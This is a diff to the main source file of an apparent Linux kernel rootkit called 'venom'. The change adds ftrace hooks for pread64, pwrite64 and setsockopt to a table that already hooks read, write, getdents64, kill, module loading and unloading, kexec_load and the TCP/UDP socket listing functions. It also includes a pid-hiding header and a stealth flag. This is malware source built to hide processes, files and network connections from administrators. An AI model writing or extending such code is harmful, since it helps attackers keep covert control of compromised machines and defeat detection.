@@ -1,23 +1,24 @@
-#include <linux/init.h> 
+#include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
 
-#include "include/headers.h" 
-#include "ftrace/ftrace.h" 
-#include "hooks/prinT.h"  
+#include "include/headers.h"
+#include "ftrace/ftrace.h"
+#include "hooks/prinT.h"
 
-#include "hooks/read.h"
 #include "hooks/write.h"
-#include "hooks/mounts.h" 
-#include "hooks/pid_hiding.h" 
+#include "hooks/read.h"
+#include "hooks/mounts.h"
+#include "hooks/pid_hiding.h"
 #include "hooks/getdents.h"
 #include "hooks/kill.h"
 #include "hooks/ioctl.h"
 #include "hooks/insmod.h"
 #include "hooks/network.h"
 #include "hooks/harden.h"
+#include "hooks/kexec_load.h"
 #include "hooks/socket.h"
-#include "hooks/kexec_load.h" 
+
 
 
 MODULE_LICENSE("GPL");
@@ -58,6 +59,8 @@ static int activate_stealth = 1;
 static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_write", hooked_write, &orig_write),
     HOOK("__x64_sys_read", hooked_read, &orig_read),
+    HOOK("__x64_sys_pread64", hooked_pread64, &orig_pread64),
+    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &orig_pwrite64),
     HOOK("__x64_sys_mount", hook_mount, &orig_mount),
     HOOK("__x64_sys_move_mount", hook_move_mount, &orig_move_mount),
     HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
@@ -65,24 +68,28 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_openat", hooked_openat, &orig_openat),
     HOOK("__x64_sys_unlinkat", hooked_unlinkat, &orig_unlinkat),
     HOOK("__x64_sys_renameat", hooked_renameat, &orig_renameat),
-    HOOK("__x64_sys_truncate", hooked_truncate, &orig_truncate),    
-    HOOK("__x64_sys_socket", hooked_socket, &orig_socket),
-    HOOK("__x64_sys_kexec_load", hooked_kexec_load, &orig_kexec_load),
+    HOOK("__x64_sys_truncate", hooked_truncate, &orig_truncate),
+
 
     HOOK("__x64_sys_init_module", hooked_init_module, &orig_init_module),
     HOOK("__x64_sys_finit_module", hooked_finit_module, &orig_finit_module),
     HOOK("__x64_sys_delete_module", hooked_delete_module, &orig_delete_module),
-    
+
+
+    HOOK("__x64_sys_kexec_load", hooked_kexec_load, &orig_kexec_load),
+
     HOOK("__x64_sys_kill", hooked_kill, &orig_kill),
-    
     HOOK("__x64_sys_ioctl", hooked_ioctl, &orig_ioctl),
-    
+
+    HOOK("__x64_sys_socket", hooked_socket, &orig_socket),
+    HOOK("__x64_sys_setsockopt", hooked_setsockopt, &orig_setsockopt),
     HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
     HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
     HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
-    
+
+
 };
 
 
@@ -145,6 +152,3 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
-
-
-
